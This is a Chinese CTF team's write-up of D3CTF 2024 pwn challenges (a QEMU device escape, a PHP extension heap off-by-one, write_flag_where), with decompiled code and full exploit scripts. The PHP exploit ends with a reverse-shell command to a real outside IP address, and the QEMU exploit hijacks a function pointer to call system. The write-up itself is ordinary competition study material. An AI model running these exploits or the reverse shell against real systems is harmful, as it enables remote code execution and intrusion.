# D3CTF 2024 Writeup  –Polaris战队

> 原文: https://www.ctfiot.com/177070.html
> ID: 177070

本次 D3CTF 2024，我们 Polaris 战队排名第8。

排名

队伍

总分

1

W&M

11933.73

2

S1uM4i

11281.00

3

LaoGong

9050.49

4

N0wayBack

8811.92

5

大吉北

8267.03

6

Nepnep

6285.29

7

Arr3stY0u

6232.42

8

Polaris

5318.53

9

emmmmmm2024

5282.20

10

USTC-Nebula

5255.60

PWN

D3BabyEscape

程序分析

其结构体构成如下：

00000000 device          struc ; (sizeof=0xD50, mappedto_113)00000000 field_0         db 2560 dup(?)00000A00 offset          dd ?00000A04 field_A04       db 560 dup(?)00000C34 content         db 256 dup(?)00000D34                 db ? ; undefined00000D35                 db ? ; undefined00000D36                 db ? ; undefined00000D37                 db ? ; undefined00000D38 srand           dq ?00000D40 rand            dq ?00000D48 rand_r          dq ?                    ; offset00000D50 device          ends

sub_480E9B -> l0dev_instance_init

void *__fastcall l0dev_instance_init(__int64 a1){  device *dev; // rax
  dev = (device *)sub_7F810F(a1, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 229LL, "l0dev_instance_init");  dev->srand = (__int64)&srand;  dev->rand = (__int64)&rand;  dev->rand_r = (int (__fastcall *)(_QWORD *))&rand_r;  return memset(dev->content, 0, sizeof(dev->content));}

sub_4809AE -> l0dev_mmio_read

__int64 __fastcall l0dev_mmio_read(__int64 opaque, unsigned __int64 addr, unsigned int size){  __int64 dest; // [rsp+30h] [rbp-20h] BYREF  device *dev; // [rsp+38h] [rbp-18h]  unsigned __int64 rounds_down; // [rsp+40h] [rbp-10h]  unsigned __int64 v8; // [rsp+48h] [rbp-8h]
  v8 = __readfsqword(0x28u);  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 82LL, "l0dev_mmio_read");  dest = -1LL;  rounds_down = addr >> 3;  if ( size > 8 )    return dest;  if ( 8 * rounds_down + size <= 0x100 )    memcpy(&dest, &dev->content[(unsigned int)(dev->offset + addr)], size);  return dest;}

sub_480A92 -> l0dev_pmio_read

__int64 __fastcall l0dev_pmio_read(__int64 opaque, unsigned __int64 addr, unsigned int size){  __int64 dest; // [rsp+30h] [rbp-20h] BYREF  device *dev; // [rsp+38h] [rbp-18h]  unsigned __int64 rounds_down; // [rsp+40h] [rbp-10h]  unsigned __int64 v8; // [rsp+48h] [rbp-8h]
  v8 = __readfsqword(0x28u);  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 104LL, "l0dev_pmio_read");  dest = -1LL;  rounds_down = addr >> 3;  if ( size > 8 )    return dest;  if ( 8 * rounds_down + size > 0x100 )    return dest;  memcpy(&dest, &dev->content[(unsigned int)addr], size);  if ( (_DWORD)dest == 666 )    ++write_enable;  return dest;}

sub_480B84 -> l0dev_mmio_write

device *__fastcall l0dev_mmio_write(__int64 opaque, unsigned __int64 addr, device *val, unsigned int size){  device *result; // rax  device *val_1; // [rsp+8h] [rbp-38h] BYREF  unsigned __int64 v7; // [rsp+10h] [rbp-30h]  __int64 v8; // [rsp+18h] [rbp-28h]  int addr_1; // [rsp+24h] [rbp-1Ch]  device *dev; // [rsp+28h] [rbp-18h]  unsigned __int64 rounds_down; // [rsp+30h] [rbp-10h]  device *v12; // [rsp+38h] [rbp-8h]
  v8 = opaque;  v7 = addr;  val_1 = val;  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 133LL, "l0dev_mmio_write");  rounds_down = addr >> 3;  result = (device *)addr;  addr_1 = addr;  if ( size <= 8 )  {    result = (device *)(8 * rounds_down + size);    if ( (unsigned __int64)result <= 0x100 )    {      if ( addr_1 == 64 )      {        v12 = val_1;        addr_1 = dev->rand_r(&val_1) % 256;        return (device *)memcpy(&dev->content[addr_1], &val_1, size);      }      else if ( addr_1 == 128 )      {        result = val_1;        if ( (unsigned __int64)val_1 <= 0x100 )        {          result = dev;          dev->offset = (unsigned int)val_1;        }      }      else      {        return (device *)memcpy(&dev->content[addr_1], &val_1, size);      }    }  }  return result;}

sub_480CBD -> l0dev_pmio_write

void *__fastcall l0dev_pmio_write(__int64 opaque, unsigned __int64 addr, __int64 val, unsigned int size){  void *result; // rax  __int64 val_1; // [rsp+8h] [rbp-38h] BYREF  unsigned __int64 addr_1; // [rsp+10h] [rbp-30h]  __int64 v8; // [rsp+18h] [rbp-28h]  int v9; // [rsp+2Ch] [rbp-14h]  device *dev; // [rsp+30h] [rbp-10h]  unsigned __int64 v11; // [rsp+38h] [rbp-8h]
  v8 = opaque;  addr_1 = addr;  val_1 = val;  dev = (device *)sub_7F810F(opaque, "l0dev", "../qemu-7.0.0/hw/misc/l0dev.c", 173LL, "l0dev_pmio_write");  if ( write_enable )    return memcpy(&dev->content[(unsigned int)(dev->offset + addr_1)], &val_1, size);  result = (void *)(addr_1 >> 3);  v11 = addr_1 >> 3;  if ( size <= 8 )  {    result = (void *)(8 * v11 + size);    if ( (unsigned __int64)result <= 0x100 )    {      v9 = addr_1;      return memcpy(&dev->content[(unsigned int)addr_1], &val_1, size);    }  }  return result;}

漏洞

利用

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <stdint.h>#include <string.h>#include <fcntl.h>#include #include <sys/mman.h>#include <sys/io.h>
char *mmio_mem;
inline static unsigned int mmio_read(unsigned int addr){    unsigned int *mmio = (unsigned int *)((size_t)mmio_mem + addr);    return *(mmio);}
inline static void mmio_write(long addr, unsigned int val){    unsigned int *mmio = (unsigned int *)((size_t)mmio_mem + addr);    *(mmio) = val;}
#define IO_PORT 0xc000inline static size_t pmio_read(size_t addr){    size_t pmio = IO_PORT + addr;    return inl(pmio);}inline static void pmio_write(size_t addr, unsigned int val){    size_t pmio = IO_PORT + addr;    outl(val, pmio);}
int main(){    int mmio_fd;    size_t libc_addr = 0, system_addr;        // Open and map I/O memory for the string device    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);    if (mmio_fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    if(iopl(3) == -1) /* Apply to system for accessing the port */    {        perror("iopl");        exit(EXIT_FAILURE);    }
    mmio_write(128, 0x100);    libc_addr = mmio_read(4);    libc_addr = libc_addr + (mmio_read(8) * 0x100000000); // srandom sym    libc_addr = libc_addr - 0x460a0; // srandom offset    printf("libc_addr: %#lxn", libc_addr);    system_addr = libc_addr + 0x50d70;
    pmio_write(0, 666);    pmio_read(0);
    pmio_write(20, system_addr);    pmio_write(24, system_addr/0x100000000);
    mmio_write(64, 0x6873);        return 0;}

PwnShell

unsigned __int64 __fastcall zif_addHacker(__int64 a1, zval *return_value){  __int64 v3; // rdi  __int64 index; // rdx MAPDST  char *p_type; // rax  chunk *v7; // r12  node *node; // rbx  char *buf; // rax  size_t arg1_len; // rdx  char *arg1_buf; // rsi  size_t end_char; // rax  zval *arg2; // [rsp+8h] [rbp-40h] MAPDST BYREF  zval *arg1; // [rsp+10h] [rbp-38h] BYREF  unsigned __int64 v16; // [rsp+18h] [rbp-30h]
  v3 = *(unsigned int *)(a1 + 44);  v16 = __readfsqword(0x28u);  if ( (unsigned int)zend_parse_parameters(v3, &unk_2000, &arg1, &arg2) != -1 )  {    if ( arg1->u1.v.type == IS_STRING && arg2->u1.v.type == IS_STRING )    {      index = 0LL;      p_type = (char *)&chunkList[0].type;      do      {        if ( *p_type == UNUSED )          break;        ++index;        p_type += 16;      }      while ( index != 16 );      v7 = &chunkList[index];      node = (node *)_emalloc(arg2->value.str->len + 16);      buf = (char *)_emalloc(arg1->value.str->len);      node->buf = buf;      arg1_len = arg1->value.str->len;      arg1_buf = arg1->value.str->val;      node->size = arg1_len;      memcpy(buf, arg1_buf, arg1_len);      memcpy(node->arg2_string, arg2->value.str->val, arg2->value.str->len);      end_char = arg2->value.str->len;      v7->node = node;      v7->type = USED;      node->arg2_string[end_char] = ' ';       // off-by-one    }    else    {      return_value->u1.type_info = IS_NULL;    }  }  return v16 - __readfsqword(0x28u);}

00000000 chunk           struc ; (sizeof=0x10, mappedto_24)00000000                                         ; XREF: .bss:
chunkList/r00000000 node            dq ?                    ; offset00000008 type            dd ?0000000C field_C         dd ?00000010 chunk           ends0000001000000000 ; ---------------------------------------------------------------------------0000000000000000 node            struc ; (sizeof=0x11, mappedto_25)00000000 buf             dq ?                    ; offset00000008 size            dq ?00000010 arg2_string     db ?00000011 node            ends

由于之前没有接触过 emalloc 和 efree 函数，因此对源码进行分析。

zmalloc函数优先从 free_slot 取内存

php-8.3.6/Zend/zend_alloc.c:
1299

static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC){#if ZEND_MM_STAT  do {    size_t size = heap->size + bin_data_size[bin_num];    size_t peak = MAX(heap->peak, size);    heap->size = size;    heap->peak = peak;  } while (0);#endif
    // 优先从 free_slot 取内存  if (EXPECTED(heap->free_slot[bin_num] != NULL)) {    zend_mm_free_slot *p = heap->free_slot[bin_num];    heap->free_slot[bin_num] = p->next_free_slot;    return p;  } else {    return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);  }}

zend_mm_alloc_small_slow中，从源码上看，取出一大块内存，分成若干小内存，取第一个返回，剩余的放入free_slot

php-8.3.6/Zend/zend_alloc.c:
1243

static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC){  zend_mm_chunk *chunk;  int page_num;  zend_mm_bin *bin;  zend_mm_free_slot *p, *end;
#if ZEND_DEBUG  bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);#else  bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);#endif  if (UNEXPECTED(bin == NULL)) {    /* insufficient memory */    return NULL;  }
  chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);  page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;  chunk->map[page_num] = ZEND_MM_SRUN(bin_num);  if (bin_pages[bin_num] > 1) {    uint32_t i = 1;
    do {      chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);      i++;    } while (i < bin_pages[bin_num]);  }
    // 从源码上看，取出一大块内存，分成若干小内存，取第一个返回，剩余的放入free_slot  /* create a linked list of elements from 1 to last */  end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));  heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);  do {    p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);#if ZEND_DEBUG    do {      zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));      dbg->size = 0;    } while (0);#endif    p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);  } while (p != end);
  /* terminate list using NULL */  p->next_free_slot = NULL;#if ZEND_DEBUG    do {      zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));      dbg->size = 0;    } while (0);#endif
  /* return first element */  return bin;}

分析Bin_index，其 size 与 index 的映射在 64 以内可以简化为 (size – 1) / 8

php-8.3.6/Zend/zend_alloc.c:
1213

static zend_always_inline int zend_mm_small_size_to_bin(size_t size){#if 0  int n;                            /*0,  1,  2,  3,  4,  5,  6,  7,  8,  9  10, 11, 12*/  static const int f1[] = { 3,  3,  3,  3,  3,  3,  3,  4,  5,  6,  7,  8,  9};  static const int f2[] = { 0,  0,  0,  0,  0,  0,  0,  4,  8, 12, 16, 20, 24};
  if (UNEXPECTED(size <= 2)) return 0;  n = zend_mm_small_size_to_bit(size - 1);  return ((size-1) >> f1[n]) + f2[n];#else  unsigned int t1, t2;
  if (size <= 64) {    /* we need to support size == 0 ... */    return (size - !!size) >> 3;  } else {    t1 = size - 1;    t2 = zend_mm_small_size_to_bit(t1) - 3;    t1 = t1 >> t2;    t2 = t2 - 3;    t2 = t2 << 2;    return (int)(t1 + t2);  }#endif}

bin_data_size的映射表，将宏定义展开为如下数组所示：

php-8.3.6/Zend/zend_alloc.c:
325

uint32_t bin_data_size[] = {8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 896, 1024, 1280, 1536, 1792, 2048, 2560, 3072 ...};

总结：size 在 64 大小以内，各 chunk 的 size 在 {8, 16, 24, 32, 40, 48, 56, 64} 上是紧密相连的。

知道 heap 逻辑后，利用 off-by-one 打 node->buf 变量，构造任意地址读写，劫持 libphp.so 的 got 表从而实现反向shell利用。

利用脚本

<?phpfunction p64(string $value):
string{    static $p64_table=[        0=>"x00",1=>"x01",2=>"x02",3=>"x03",4=>"x04",5=>"x05",6=>"x06",7=>"x07",8=>"x08",9=>"x09",10=>"x0a",        11=>"x0b",12=>"x0c",13=>"x0d",14=>"x0e",15=>"x0f",16=>"x10",17=>"x11",18=>"x12",19=>"x13",20=>"x14",        21=>"x15",22=>"x16",23=>"x17",24=>"x18",25=>"x19",26=>"x1a",27=>"x1b",28=>"x1c",29=>"x1d",30=>"x1e",        31=>"x1f",32=>"x20",33=>"x21",34=>"x22",35=>"x23",36=>"x24",37=>"x25",38=>"x26",39=>"x27",40=>"x28",        41=>"x29",42=>"x2a",43=>"x2b",44=>"x2c",45=>"x2d",46=>"x2e",47=>"x2f",48=>"x30",49=>"x31",50=>"x32",        51=>"x33",52=>"x34",53=>"x35",54=>"x36",55=>"x37",56=>"x38",57=>"x39",58=>"x3a",59=>"x3b",60=>"x3c",        61=>"x3d",62=>"x3e",63=>"x3f",64=>"x40",65=>"x41",66=>"x42",67=>"x43",68=>"x44",69=>"x45",70=>"x46",        71=>"x47",72=>"x48",73=>"x49",74=>"x4a",75=>"x4b",76=>"x4c",77=>"x4d",78=>"x4e",79=>"x4f",80=>"x50",        81=>"x51",82=>"x52",83=>"x53",84=>"x54",85=>"x55",86=>"x56",87=>"x57",88=>"x58",89=>"x59",90=>"x5a",        91=>"x5b",92=>"x5c",93=>"x5d",94=>"x5e",95=>"x5f",96=>"x60",97=>"x61",98=>"x62",99=>"x63",100=>"x64",        101=>"x65",102=>"x66",103=>"x67",104=>"x68",105=>"x69",106=>"x6a",107=>"x6b",108=>"x6c",109=>"x6d",110=>"x6e",        111=>"x6f",112=>"x70",113=>"x71",114=>"x72",115=>"x73",116=>"x74",117=>"x75",118=>"x76",119=>"x77",120=>"x78",        121=>"x79",122=>"x7a",123=>"x7b",124=>"x7c",125=>"x7d",126=>"x7e",127=>"x7f",128=>"x80",129=>"x81",130=>"x82",        131=>"x83",132=>"x84",133=>"x85",134=>"x86",135=>"x87",136=>"x88",137=>"x89",138=>"x8a",139=>"x8b",140=>"x8c",        141=>"x8d",142=>"x8e",143=>"x8f",144=>"x90",145=>"x91",146=>"x92",147=>"x93",148=>"x94",149=>"x95",150=>"x96",        151=>"x97",152=>"x98",153=>"x99",154=>"x9a",155=>"x9b",156=>"x9c",157=>"x9d",158=>"x9e",159=>"x9f",160=>"xa0",        161=>"xa1",162=>"xa2",163=>"xa3",164=>"xa4",165=>"xa5",166=>"xa6",167=>"xa7",168=>"xa8",169=>"xa9",170=>"xaa",        171=>"xab",172=>"xac",173=>"xad",174=>"xae",175=>"xaf",176=>"xb0",177=>"xb1",178=>"xb2",179=>"xb3",180=>"xb4",        181=>"xb5",182=>"xb6",183=>"xb7",184=>"xb8",185=>"xb9",186=>"xba",187=>"xbb",188=>"xbc",189=>"xbd",190=>"xbe",        191=>"xbf",192=>"xc0",193=>"xc1",194=>"xc2",195=>"xc3",196=>"xc4",197=>"xc5",198=>"xc6",199=>"xc7",200=>"xc8",        201=>"xc9",202=>"xca",203=>"xcb",204=>"xcc",205=>"xcd",206=>"xce",207=>"xcf",208=>"xd0",209=>"xd1",210=>"xd2",        211=>"xd3",212=>"xd4",213=>"xd5",214=>"xd6",215=>"xd7",216=>"xd8",217=>"xd9",218=>"xda",219=>"xdb",220=>"xdc",        221=>"xdd",222=>"xde",223=>"xdf",224=>"xe0",225=>"xe1",226=>"xe2",227=>"xe3",228=>"xe4",229=>"xe5",230=>"xe6",        231=>"xe7",232=>"xe8",233=>"xe9",234=>"xea",235=>"xeb",236=>"xec",237=>"xed",238=>"xee",239=>"xef",240=>"xf0",        241=>"xf1",242=>"xf2",243=>"xf3",244=>"xf4",245=>"xf5",246=>"xf6",247=>"xf7",248=>"xf8",249=>"xf9",250=>"xfa",        251=>"xfb",252=>"xfc",253=>"xfd",254=>"xfe",255=>"xff"    ];    $result = "";    for($i = 0; $i < 8; $i++){        $remainder = $value % 0x100;        $value =  (int)($value/0x100);        $result .= $p64_table[$remainder];    }    return $result;}function u64(string $bytes):
int{    static $u64_table=[        "x00"=>0,"x01"=>1,"x02"=>2,"x03"=>3,"x04"=>4,"x05"=>5,"x06"=>6,"x07"=>7,"x08"=>8,"x09"=>9,"x0a"=>10,        "x0b"=>11,"x0c"=>12,"x0d"=>13,"x0e"=>14,"x0f"=>15,"x10"=>16,"x11"=>17,"x12"=>18,"x13"=>19,"x14"=>20,        "x15"=>21,"x16"=>22,"x17"=>23,"x18"=>24,"x19"=>25,"x1a"=>26,"x1b"=>27,"x1c"=>28,"x1d"=>29,"x1e"=>30,        "x1f"=>31,"x20"=>32,"x21"=>33,"x22"=>34,"x23"=>35,"x24"=>36,"x25"=>37,"x26"=>38,"x27"=>39,"x28"=>40,        "x29"=>41,"x2a"=>42,"x2b"=>43,"x2c"=>44,"x2d"=>45,"x2e"=>46,"x2f"=>47,"x30"=>48,"x31"=>49,"x32"=>50,        "x33"=>51,"x34"=>52,"x35"=>53,"x36"=>54,"x37"=>55,"x38"=>56,"x39"=>57,"x3a"=>58,"x3b"=>59,"x3c"=>60,        "x3d"=>61,"x3e"=>62,"x3f"=>63,"x40"=>64,"x41"=>65,"x42"=>66,"x43"=>67,"x44"=>68,"x45"=>69,"x46"=>70,        "x47"=>71,"x48"=>72,"x49"=>73,"x4a"=>74,"x4b"=>75,"x4c"=>76,"x4d"=>77,"x4e"=>78,"x4f"=>79,"x50"=>80,        "x51"=>81,"x52"=>82,"x53"=>83,"x54"=>84,"x55"=>85,"x56"=>86,"x57"=>87,"x58"=>88,"x59"=>89,"x5a"=>90,        "x5b"=>91,"x5c"=>92,"x5d"=>93,"x5e"=>94,"x5f"=>95,"x60"=>96,"x61"=>97,"x62"=>98,"x63"=>99,"x64"=>100,        "x65"=>101,"x66"=>102,"x67"=>103,"x68"=>104,"x69"=>105,"x6a"=>106,"x6b"=>107,"x6c"=>108,"x6d"=>109,"x6e"=>110,        "x6f"=>111,"x70"=>112,"x71"=>113,"x72"=>114,"x73"=>115,"x74"=>116,"x75"=>117,"x76"=>118,"x77"=>119,"x78"=>120,        "x79"=>121,"x7a"=>122,"x7b"=>123,"x7c"=>124,"x7d"=>125,"x7e"=>126,"x7f"=>127,"x80"=>128,"x81"=>129,"x82"=>130,        "x83"=>131,"x84"=>132,"x85"=>133,"x86"=>134,"x87"=>135,"x88"=>136,"x89"=>137,"x8a"=>138,"x8b"=>139,"x8c"=>140,        "x8d"=>141,"x8e"=>142,"x8f"=>143,"x90"=>144,"x91"=>145,"x92"=>146,"x93"=>147,"x94"=>148,"x95"=>149,"x96"=>150,        "x97"=>151,"x98"=>152,"x99"=>153,"x9a"=>154,"x9b"=>155,"x9c"=>156,"x9d"=>157,"x9e"=>158,"x9f"=>159,"xa0"=>160,        "xa1"=>161,"xa2"=>162,"xa3"=>163,"xa4"=>164,"xa5"=>165,"xa6"=>166,"xa7"=>167,"xa8"=>168,"xa9"=>169,"xaa"=>170,        "xab"=>171,"xac"=>172,"xad"=>173,"xae"=>174,"xaf"=>175,"xb0"=>176,"xb1"=>177,"xb2"=>178,"xb3"=>179,"xb4"=>180,        "xb5"=>181,"xb6"=>182,"xb7"=>183,"xb8"=>184,"xb9"=>185,"xba"=>186,"xbb"=>187,"xbc"=>188,"xbd"=>189,"xbe"=>190,        "xbf"=>191,"xc0"=>192,"xc1"=>193,"xc2"=>194,"xc3"=>195,"xc4"=>196,"xc5"=>197,"xc6"=>198,"xc7"=>199,"xc8"=>200,        "xc9"=>201,"xca"=>202,"xcb"=>203,"xcc"=>204,"xcd"=>205,"xce"=>206,"xcf"=>207,"xd0"=>208,"xd1"=>209,"xd2"=>210,        "xd3"=>211,"xd4"=>212,"xd5"=>213,"xd6"=>214,"xd7"=>215,"xd8"=>216,"xd9"=>217,"xda"=>218,"xdb"=>219,"xdc"=>220,        "xdd"=>221,"xde"=>222,"xdf"=>223,"xe0"=>224,"xe1"=>225,"xe2"=>226,"xe3"=>227,"xe4"=>228,"xe5"=>229,"xe6"=>230,        "xe7"=>231,"xe8"=>232,"xe9"=>233,"xea"=>234,"xeb"=>235,"xec"=>236,"xed"=>237,"xee"=>238,"xef"=>239,"xf0"=>240,        "xf1"=>241,"xf2"=>242,"xf3"=>243,"xf4"=>244,"xf5"=>245,"xf6"=>246,"xf7"=>247,"xf8"=>248,"xf9"=>249,"xfa"=>250,        "xfb"=>251,"xfc"=>252,"xfd"=>253,"xfe"=>254,"xff"=>255    ];    $result = 0;    for($i = 7; $i >= 0; $i--){        $result = $u64_table[$bytes[$i]] + $result * 0x100;    }    return $result;}function hex64(int $value):
string{    static $hex64_table=[        0=>"0",1=>"1",2=>"2",3=>"3",4=>"4",5=>"5",6=>"6",7=>"7",8=>"8",9=>"9",10=>"a",        11=>"b",12=>"c",13=>"d",14=>"e",15=>"f"    ];    $result = "";    for($i = 0; $i < 16; $i++){        $remainder = $value % 0x10;        $value =  (int)($value/0x10);        $result = $hex64_table[$remainder] . $result;    }    return "0x" . $result;}
echo "Step Onen";
addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");addHacker("ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc", "ddddddddddddddddddddddddddddddddddddddddddddddd");
removeHacker(0);addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
echo "Step Twon";
$heap_addr = (u64(displayHacker(1)) - 0x72240) & 0xfffffffffffff000;
echo "heap_addr: ". hex64($heap_addr)."n";
editHacker(1, p64($heap_addr+0x1010));$libphp_so_addr = u64(displayHacker(3)) - 0xf8da60;
echo "libphp_so_addr: ". hex64($libphp_so_addr)."n";
editHacker(1, p64($libphp_so_addr+0x101C130));$libc_so_6_addr = u64(displayHacker(3)) - 0x525b0;
echo "libc_so_6_addr: ". hex64($libc_so_6_addr)."n";
editHacker(1, p64($libphp_so_addr+0x101E760));$_emalloc_got_addr = u64(displayHacker(3));
echo "_emalloc_got_addr: ". hex64($_emalloc_got_addr)."n";
echo "Step Threen";
editHacker(3, p64($libc_so_6_addr + 0x4c490));
editHacker(1, p64($heap_addr+0x80100));
editHacker(3, "bash -c 'sh >& /dev/tcp/110.42.237.28/60105 0>&1' ");
echo "Endn";
?>

write_flag_where

程序先读入flag,然后允许我们使用 write 函数向libc的code段代码写入flag的中间一个字符,也就是 d3ctf{????????????????}中????????????????为我们可挑选的字符范围，且每个 ? 一定在 0123456789abcdef 范围中。

也就是说，程序允许我们向 libc 的 code 段代码（可执行段）写入 0123456789abcdef 中随机一个字符，该写入的字符不可控制，但是可以爆破，并且写入次数不限。

其源码如下：

#include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <fcntl.h>
#define FLAG_PREFIX "d3ctf{"#define FLAG_PREFIX_LENGTH (sizeof(FLAG_PREFIX)-1)#define FLAG_SUFFIX "}"#define FLAG_SUFFIX_LENGTH (sizeof(FLAG_SUFFIX)-1)#define LIBC_NAME "libc"
char maps[0x1000], flag[0x100];
uint64_t libc_code_addr_start, libc_code_addr_end;
void write_mem(uint64_t addr, uint8_t byte) {  int fd = open("/proc/self/mem", O_RDWR);  lseek(fd, addr, SEEK_SET);  write(fd, &byte, 1);  close(fd);}
void init() {  setvbuf(stdin, NULL, _IONBF, 0);  setvbuf(stdout, NULL, _IONBF, 0);  setvbuf(stderr, NULL, _IONBF, 0);
  FILE* maps_stream = fopen("/proc/self/maps", "r");
  int count = 1;  char *line = NULL;  uint64_t len = 0;  uint64_t addr_start = 0, addr_end = 0, offset = 0, major_id = 0, minor_id = 0, inode_id = 0;  char mode[0x10], file_path[0x100];  memset(mode, 0, sizeof(mode));  memset(file_path, 0, sizeof(file_path));
  while (getline(&line, &len, maps_stream) != -1 ) {    sscanf(line,"%lx-%lx%s%lx%lu:%lu%lu%s",      &addr_start, &addr_end, mode, &offset,      &major_id, &minor_id, &inode_id, file_path    );    if (count == 10) {      libc_code_addr_start = addr_start;      libc_code_addr_end = addr_end;      break;    }    count++;  }
  if (line) {    printf("%s", line);    free(line);  }  fclose(maps_stream);
  int fd = open("/flag", O_RDONLY);  read(fd, flag, 0x100);  close(fd);}
int main(int argc, char *argv[]) {  init();
  uint64_t addr = 0;  uint offset = 0;
  printf("flag: "FLAG_PREFIX"[a-f0-9]{%lu}"FLAG_SUFFIX"n", strlen(flag) - FLAG_PREFIX_LENGTH - FLAG_SUFFIX_LENGTH);
  while (scanf("%lu%u", &addr, &offset) == 2) {    if (!(libc_code_addr_start <= addr && addr < libc_code_addr_end) ||        !(offset >= FLAG_PREFIX_LENGTH && offset < strlen(flag) - FLAG_SUFFIX_LENGTH))      break;
    write_mem(addr, flag[offset]);  }
  return 0;}

.text:
000000000011B280                   write           proc near               ; CODE XREF: .text:
00000000000282E5↑j.text:
000000000011B280                                                           ; start+1B↑p ....text:
000000000011B280.text:
000000000011B280                   fd              = qword ptr -20h.text:
000000000011B280                   buf             = qword ptr -18h.text:
000000000011B280                   count           = qword ptr -10h.text:
000000000011B280.text:
000000000011B280                   ; __unwind {.text:
000000000011B280 F3 0F 1E FA                       endbr64                 ; Alternative name is '__write'.text:
000000000011B284 80 3D B5 B2 0E 00                 cmp     cs:
__libc_single_threaded, 0.text:
000000000011B284 00.text:
000000000011B28B 74 13                             jz      short loc_11B2A0.text:
000000000011B28D B8 01 00 00 00                    mov     eax, 1.text:
000000000011B292 0F 05                             syscall                 ; LINUX - sys_write.text:
000000000011B294 48 3D 00 F0 FF FF                 cmp     rax, 0FFFFFFFFFFFFF000h.text:
000000000011B29A 77 54                             ja      short loc_11B2F0.text:
000000000011B29C C3                                retn.text:
000000000011B29C                   ; ---------------------------------------------------------------------------.text:
000000000011B29D 0F 1F 00                          align 20h.text:
000000000011B2A0.text:
000000000011B2A0                   loc_11B2A0:                             ; CODE XREF: write+B↑j.text:
000000000011B2A0 48 83 EC 28                       sub     rsp, 28h.text:
000000000011B2A4 48 89 54 24 18                    mov     [rsp+28h+count], rdx.text:
000000000011B2A9 48 89 74 24 10                    mov     [rsp+28h+buf], rsi.text:
000000000011B2AE 89 7C 24 08                       mov     dword ptr [rsp+28h+fd], edi.text:
000000000011B2B2 E8 39 86 F7 FF                    call    sub_938F0.text:
000000000011B2B7 48 8B 54 24 18                    mov     rdx, [rsp+28h+count] ; count.text:
000000000011B2BC 48 8B 74 24 10                    mov     rsi, [rsp+28h+buf] ; buf.text:
000000000011B2C1 41 89 C0                          mov     r8d, eax.text:
000000000011B2C4 8B 7C 24 08                       mov     edi, dword ptr [rsp+28h+fd] ; fd.text:
000000000011B2C8 B8 01 00 00 00                    mov     eax, 1.text:
000000000011B2CD 0F 05                             syscall                 ; LINUX - sys_write.text:
000000000011B2CF 48 3D 00 F0 FF FF                 cmp     rax, 0FFFFFFFFFFFFF000h.text:
000000000011B2D5 77 31                             ja      short loc_11B308.text:
000000000011B2D7.text:
000000000011B2D7                   loc_11B2D7:                             ; CODE XREF: write+9B↓j.text:
000000000011B2D7 44 89 C7                          mov     edi, r8d.text:
000000000011B2DA 48 89 44 24 08                    mov     [rsp+28h+fd], rax.text:
000000000011B2DF E8 8C 86 F7 FF                    call    sub_93970.text:
000000000011B2E4 48 8B 44 24 08                    mov     rax, [rsp+28h+fd].text:
